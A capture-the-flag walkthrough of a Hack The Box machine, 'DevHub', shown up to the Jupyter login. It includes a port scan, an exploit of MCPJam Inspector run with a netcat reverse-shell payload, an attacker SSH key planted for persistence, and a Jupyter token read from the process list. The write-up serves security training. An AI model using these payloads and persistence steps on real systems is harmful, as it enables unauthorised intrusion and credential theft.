<img src="Images/01-Banner.png" width="600">

## HTB-DevHub

We will begin this machine by using Nmap to scan the server for all open TCP ports, service versions and perform script scanning:

#### Nmap scan:

```
nmap -p0-65535 -sCV 10.129.245.216
```

#### Results:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Mon, 09 Nov 2026 12:33:39 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Mon, 09 Nov 2026 12:33:39 GMT
|_    Connection: close
```

## User -> MCP-Dev

The results reveal that an Nginx web server is running on port 80 and MCPJam Inspector is running on port 6274. Let's visit port 80:

<img src="Images/03-Landing.png" width="600">

As we can see, MCPJam is shown to be running. Let's investigate that next:

<img src="Images/04-MCPjam.png" width="600">

This reveals the version is 1.4.2. A search for related exploits reveals the following Proof of Concept:

<img src="Images/05-Exploit-Location.png" width="600">

The documentation show's how we can obtain code execution on the server. Let's first start a listener before modifying the exploit so that we can execute a reverse shell:

#### Starting the listener:

```
nc -lvnp 4444
```

#### Downloading the exploit:

```
git clone https://github.com/boroeurnprach/CVE-2026-23744-PoC
```

#### Running the exploit:

```
python3 exploit.py devhub.htb 'busybox nc 10.10.14.28 4444 -e /bin/bash'
```

#### Exploit output:

```
[*] Waiting for server to start on port 6274...
[+] Server is up and running.
[*] Sending exploit payload...
[*] Request failed (this might be expected if the command execution interrupts the connection): HTTPConnectionPool(host='devhub.htb', port=6274): Read timed out. (read timeout=5)
[+] Payload sent.
```

#### Listener output:

```
Listening on 0.0.0.0 4444
Connection received on 10.129.245.216 47714
id
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
```

We then use the following commands to stabilise the shell:

```bash
python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
export TERM=xterm
ctrl-z
stty raw -echo; fg
```

## MCP-Dev -> Analyst

We will now generate SSH keys for the target machine using ssh-keygen before importing our attacker host public key into the authorized keys file:

#### Key generation on victim machine:

```
ssh-keygen
```

#### Output:

```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/mcp-dev/.ssh/id_rsa): 
Created directory '/home/mcp-dev/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/mcp-dev/.ssh/id_rsa
Your public key has been saved in /home/mcp-dev/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:+AFc1i370+TY86n7eVGRTvNkMztP1hqzTFkQENdHeT0 mcp-dev@devhub
The key's randomart image is:
+---[RSA 3072]----+
|        o. .oo+==|
|     . o  o .. EO|
|      o    o  o=%|
|       o  .   *+*|
|      . S  . O B+|
|       . .  + O..|
|        .    . oo|
|               .+|
|             o+o.|
+----[SHA256]-----+
```

#### Key generation on attacker machine:

```
ssh-keygen
```

#### Reading attacker public key:

```
cat /root/.ssh/id_ed25519.pub
```

#### Output:

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA19Tw8D/Jv2ecF1vmaK946E5bhE9Ne9UeehFJ08wB4W root@htb-c6lz08re7g
```

Now let's update the victim machine's authorized_keys file:

```
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA19Tw8D/Jv2ecF1vmaK946E5bhE9Ne9UeehFJ08wB4W root@htb-c6lz08re7g" >> /home/mcp-dev/.ssh/authorized_keys
```

Now, we can log into the machine using the attacker machine's private key:

#### Logging in using SSH:

```
ssh -i /root/.ssh/id_ed25519 mcp-dev@10.129.245.216
```

#### Output:

```
mcp-dev@devhub:~$ 
```

Enumerating the system, we display running processes for the analyst user, which discloses a token for Jupyter notebook on port 8888:

#### Reading running processes:

```
ps aux | grep analyst
```

#### Extracting sensitive token value:

```
--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

The process also discloses that port 8888 is running Jupyter Notebook. Let's forward that port using our SSH session:

#### Port forwarding:

```
ssh -i /root/.ssh/id_ed25519 mcp-dev@10.129.245.216 -L 8888:127.0.0.1:8888
```

Now we will visit port 8888 on our attacker machine before using our newly discovered token to log into Jupyter Notebook:

<img src="Images/13-Jupyter1.png" width="600">

Logging into Jupyter reveals that we have access to a Python console:


